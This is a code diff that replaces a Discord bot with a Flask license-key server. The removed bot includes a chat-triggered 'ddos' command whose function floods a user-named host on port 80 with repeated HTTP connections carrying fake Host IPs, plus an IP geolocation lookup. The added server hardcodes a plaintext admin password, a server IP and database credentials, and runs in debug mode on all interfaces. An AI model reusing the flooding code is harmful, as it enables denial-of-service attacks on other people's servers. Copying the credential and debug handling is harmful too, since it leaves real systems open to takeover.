@@ -1,164 +1,209 @@
-import requests
-import socket
-import random
-import threading 
-import asyncio
-import discord
-import time
-import json
-import os
-import re
-from urllib import request 
-from time import sleep
-from datetime import datetime
+from flask import Flask, request, jsonify, render_template_string
+from flask_httpauth import HTTPBasicAuth
+import mysql.connector
+from datetime import datetime, timedelta
 
-attack_number = 1
-port = 80
-target = ""
-totalattack = 0
+app = Flask(__name__)
+auth = HTTPBasicAuth()
 
-YOUR_CHANNEL_ID = ""
-TOKEN = ''
+# In-memory user data
+users = {
+    "bagasW": "Bagas030208"
+}
 
-intents = discord.Intents.default()
-intents.message_content = True
-client = discord.Client(intents=intents)
+urlLisensi = "http://156.67.216.77:5001"
 
-def get_online_users():
-    url = "https://www.growtopiagame.com/detail"
-    response = requests.get(url)
+@auth.get_password
+def get_pw(username):
+    if username in users:
+        return users.get(username)
+    return None
 
-    if response.status_code == 200:
-        content = response.text
-        start_index = content.find('{"online_user":"') + len('{"online_user":"')
-        end_index = content.find('","world_day_images":')
-        
-        online_users = content[start_index:end_index]
-        return "Jumlah player online: " + online_users
+# MySQL database connection
+def get_db_connection():
+    connection = mysql.connector.connect(
+        host='156.67.216.77',
+        user='bagas',
+        password='your_password',
+        database='lisensiScript'
+    )
+    return connection
+
+# POST request to add license with Basic Authentication
+@app.route('/add_license', methods=['POST'])
+@auth.login_required
+def add_license():
+    data = request.json if request.is_json else request.form
+    license_key = data.get('license_key')
+    active_time = int(data.get('active_time'))
+    script = data.get('script')
+    conn = get_db_connection()
+    cursor = conn.cursor(dictionary=True)
+    
+    # Check if the license key already exists
+    cursor.execute("SELECT * FROM Licenses WHERE license_key = %s AND script = %s", (license_key, script))
+    license = cursor.fetchone()
+    if license:
+        conn.close()
+        return jsonify({"status": "License key already exists"}), 400
+    
+    # Insert new license into database
+    cursor.execute("INSERT INTO Licenses (license_key, active_time, script) VALUES (%s, %s, %s)", 
+                   (license_key, active_time, script))
+    
+    conn.commit()
+    conn.close()
+    
+    return jsonify({"status": "License added successfully",
+                    "license_key": license_key,
+                    "active_time": active_time,
+                    "script": script}), 200
+
+# GET request to login and update start time if necessary
+@app.route('/login/<script>/<license_key>', methods=['GET'])
+def login(script, license_key):
+    date_str = request.args.get('date')
+    date = datetime.strptime(date_str, '%Y-%m-%d %H:%M:%S')
+    
+    conn = get_db_connection()
+    cursor = conn.cursor(dictionary=True)
+    
+    cursor.execute("SELECT * FROM Licenses WHERE license_key = %s AND script = %s", (license_key, script))
+    license = cursor.fetchone()
+    
+    if not license:
+        return jsonify({"status": "Invalid license key",
+          "is_valid": False
+        }), 400
+    
+    if not license['start_time']:
+        expired_time = date + timedelta(days=license['active_time'])
+        cursor.execute("UPDATE Licenses SET start_time = %s, expired_time = %s WHERE license_key = %s AND script = %s",
+                       (date, expired_time, license_key, script))
+        conn.commit()
+        return jsonify({
+            "status": "Login successful",
+            "url": urlLisensi,
+            "start_time": date.strftime('%Y-%m-%d %H:%M:%S'),
+            "expired_time": expired_time.strftime('%Y-%m-%d %H:%M:%S')
+        }), 200
     else:
-        return "Gagal memperoleh data, silahkan cek koneksi internet anda."
-import requests
+        expired_time = license['expired_time']
+        if date < expired_time:
+            return jsonify({
+                "status": "Login successful",
+                "url": urlLisensi,
+                "start_time": license['start_time'].strftime('%Y-%m-%d %H:%M:%S'),
+                "expired_time": expired_time.strftime('%Y-%m-%d %H:%M:%S'),
+                "is_valid": True
+            }), 200
+        else:
+            return jsonify({
+                "status": "License expired",
+                "expired_time": expired_time.strftime('%Y-%m-%d %H:%M:%S'),
+                "is_valid": False
+            }), 400
 
-def get_public_ip():
-    try:
-        response = requests.get('https://api64.ipify.org?format=json')
-        data = response.json()
-        public_ip = data['ip']
-        return public_ip
-    except Exception as e:
-        return str(e)
+@app.route('/controlDb', methods=['GET'])
+@auth.login_required
+def control_db():
+    conn = get_db_connection()
+    cursor = conn.cursor(dictionary=True)
+    cursor.execute("SELECT * FROM Licenses")
+    licenses = cursor.fetchall()
+    conn.close()
+  
+    html = '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>License Control</title>
+    </head>
+    <body>
+        <h1>License Control</h1>
+        <table border="1">
+            <tr>
+                <th>ID</th>
+                <th>License Key</th>
+                <th>Script</th>
+                <th>Active Time</th>
+                <th>Start Time</th>
+                <th>Expired Time</th>
+                <th>Actions</th>
+            </tr>
+            {% for license in licenses %}
+            <tr>
+                <td>{{ license['id'] }}</td>
+                <td>{{ license['license_key'] }}</td>
+                <td>{{ license['script'] }}</td>
+                <td>{{ license['active_time'] }}</td>
+                <td>{{ license['start_time'] }}</td>
+                <td>{{ license['expired_time'] }}</td>
+                <td>
+                    <form action="/edit_license/{{ license['id'] }}" method="post">
+                        <input type="hidden" name="id" value="{{ license['id'] }}">
+                        <input type="text" name="license_key" value="{{ license['license_key'] }}">
+                        <input type="text" name="script" value="{{ license['script'] }}">
+                        <input type="text" name="active_time" value="{{ license['active_time'] }}">
+                        <input type="text" name="start_time" value="{{ license['start_time'] }}">
+                        <input type="text" name="expired_time" value="{{ license['expired_time'] }}">
+                        <input type="submit" value="Edit">
+                    </form>
+                    <form action="/delete_license/{{ license['id'] }}" method="post" onsubmit="return confirm('Are you sure you want to delete this license?');">
+                        <input type="hidden" name="id" value="{{ license['id'] }}">
+                        <input type="submit" value="Delete">
+                    </form>
+                </td>
+            </tr>
+            {% endfor %}
+        </table>
+        <h2>Add New License</h2>
+        <form action="/add_license" method="post">
+            <input type="text" name="license_key" placeholder="License Key" required>
+            <input type="text" name="script" placeholder="Script" required>
+            <input type="number" name="active_time" placeholder="Active Time (days)" required>
+            <input type="submit" value="Add License">
+        </form>
+    </body>
+    </html>
+    '''
+    return render_template_string(html, licenses=licenses)
 
-def get_ping_to_discord():
-    discord_ip = "discordapp.com"
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    start_time = time.time()
-    sock.connect((discord_ip, 80))
-    end_time = time.time()
-    elapsed_time = end_time - start_time
-    sock.close()
-    return f"IP Bot: {discord_ip}, Ping: {elapsed_time:.2f} seconds"
+# Endpoint untuk mengedit lisensi
+@app.route('/edit_license/<int:id>', methods=['POST'])
+@auth.login_required
+def edit_license(id):
+    data = request.form
+    license_key = data.get('license_key')
+    script = data.get('script')
+    active_time = data.get('active_time')
+    start_time = data.get('start_time')
+    expired_time = data.get('expired_time')
     
-def get_ip_request(ip_address):
-	url = "http://ip-api.com/json/" + ip_address
-	r = request.urlopen(url) 
-	data = r.read() 
-	m = json.loads(data)
-	response_text = f'''
-        Status: {m['status']}\nIP: {m['query']} \nNegara: {m['country']}\nKode Negara: {m['countryCode']}\nKota: {m['city']}\nWilayah: {m['region']}\nNama Wilayah: {m['regionName']}\nZona Waktu: {m['timezone']}\nISP: {m['isp']}\nOrganisasi: {m['org']}\nKode Pos: {m['zip']}\nGaris Lintang: {m['lat']}\nGaris Bujur: {m['lon']}\nAS: {m['as']} 
-         '''
-	return response_text
-	
-async def CommandTerminal():
-    while True:
-        global YOUR_CHANEL_ID
-        user_input = input("$ : ")
-        if user_input.startswith("say "):
-            kata = user_input[4:]
-            print("Sedang Memperoleh Data...")
-            await client.wait_until_ready()
-            channel = client.get_channel(YOUR_CHANNEL_ID)
-            if channel:
-                await channel.send(f"Message from terminal: {kata}")
-
-def generate_random_ip():
-    ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
-    return ip
+    conn = get_db_connection()
+    cursor = conn.cursor(dictionary=True)
+    cursor.execute("""
+        UPDATE Licenses 
+        SET license_key = %s, script = %s, active_time = %s, start_time = %s, expired_time = %s 
+        WHERE id = %s
+    """, (license_key, script, active_time, start_time, expired_time, id))
+    conn.commit()
+    conn.close()
     
-def ddos(targets,totalattacks):
-	global attack_number
-	attack_number = 1
-	while attack_number < totalattacks:
-		fake_ip = generate_random_ip()
-		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		soc.connect((targets, port))
-		soc.send(("GET /" + targets + " HTTP/1.1\r\n").encode("ascii"))
-		soc.send(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"))
-		print(f'''Serangan Berhasil : {targets} : {attack_number} menggunakan : {fake_ip} ; {port} ''')
-		attack_number += 1
-		soc.close()
-		
-		if attack_number == totalattacks:
-			return totalattacks
-			attack_number = 1
+    return jsonify({"status": "License updated successfully"}), 200
 
-
-@client.event
-async def on_ready():
-    print(f'Logged in as {client.user.name}')
-    print("Internet Local Ip : "+get_public_ip())
-    print(get_ping_to_discord()+'\n')
+# Endpoint untuk menghapus lisensi
+@app.route('/delete_license/<int:id>', methods=['POST'])
+@auth.login_required
+def delete_license(id):
+    conn = get_db_connection()
+    cursor = conn.cursor(dictionary=True)
+    cursor.execute("DELETE FROM Licenses WHERE id = %s", (id,))
+    conn.commit()
+    conn.close()
     
-@client.event
-async def on_message(message):
-    if message.author == client.user:
-        return
-    if message.content.lower() == 'gtonline':
-        await message.channel.send("Sedang Memperoleh Data...")
-        print("Mendapatkan Request Get Online Player")
-        await message.channel.send(get_online_users())
-        sender_name = message.author.name
-        message_content = message.content
-        timestamp = message.created_at.strftime('%Y-%m-%d %H:%M:%S')
-        
-        log_message = f'Sender: {sender_name}\nMessage: {message_content}\nTimestamp: {timestamp}'
-        print("Log Message {\n" + log_message + '}')
-    elif message.content.lower() in ['hai','hello','hi','hallo','halo','helo']:
-        sender_name = message.author.name
-        message_content = message.content
-        timestamp = message.created_at.strftime('%Y-%m-%d %H:%M:%S')
-        log_message = f'Sender: {sender_name}\nMessage: {message_content}\nTimestamp: {timestamp}'
-        print("Log Message {\n" + log_message + '}')
-        await message.channel.send(message_content+', Apa yang bisa saya bantu ?')
-    elif message.content == '!embed':
-        embed = discord.Embed(title='Judul Embed', description='Ini adalah contoh pesan embedded.', color=discord.Color.blue())
-        embed.add_field(name='Field 1', value='Nilai 1', inline=False)
-        embed.add_field(name='Field 2', value='Nilai 2', inline=False)
-        embed.set_footer(text='Ini adalah footer')
-        await message.channel.send(embed=embed)
-    elif message.content.lower().startswith('getip'):
-    	ip_address = message.content.lower().replace('getip', '').strip()
-    	await message.channel.send("Mendapatkan informasi IP...")
-    	print("Mendapatkan Request Ip Tracker " + ip_address)
-    	embed = discord.Embed(title='INFORMASI IP '+ip_address, description=get_ip_request(ip_address), color=discord.Color.blue())
-    	await message.channel.send(embed=embed)
-    	sender_name = message.author.name
-    	message_content = message.content
-    	timestamp = message.created_at.strftime('%Y-%m-%d %H:%M:%S')
-    	log_message = f'Sender: {sender_name}\nMessage: {message_content}\nTimestamp: {timestamp}'
-    	print("Log Message {\n" + log_message + '}')
-    elif message.content.lower().startswith('ddos'):
-    	pesan = message.content.lower()
-    	sender_name = message.author.name
-    	message_content = message.content
-    	timestamp = message.created_at.strftime('%Y-%m-%d %H:%M:%S')
-    	log_message = f'Sender: {sender_name}\nMessage: {message_content}\nTimestamp: {timestamp}'
-    	print("Log Message {\n" + log_message + '}')
-    	pola = r'ddos:(?P<ip>[^\s]*) amount:(?P<brp>[^\s]*)'
-    	cocok = re.search(pola, pesan)
-    	target = str(cocok.group('ip'))
-    	jumlah = int(cocok.group('brp'))
-    	print("Mendapatkan Request Ddos "+str(target) +" Dengan Jumlah "+str(jumlah))
-    	await message.channel.send("Melakukan penyerangan "+str(target)+" "+str(jumlah))
-    	await message.channel.send("Berhasil Melakukan Serangan "+str(target)+" Sejumlah "+ str(ddos(target,jumlah)))
-    	
-client.run(TOKEN)
+    return jsonify({"status": "License deleted successfully"}), 200
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=True)
+		    
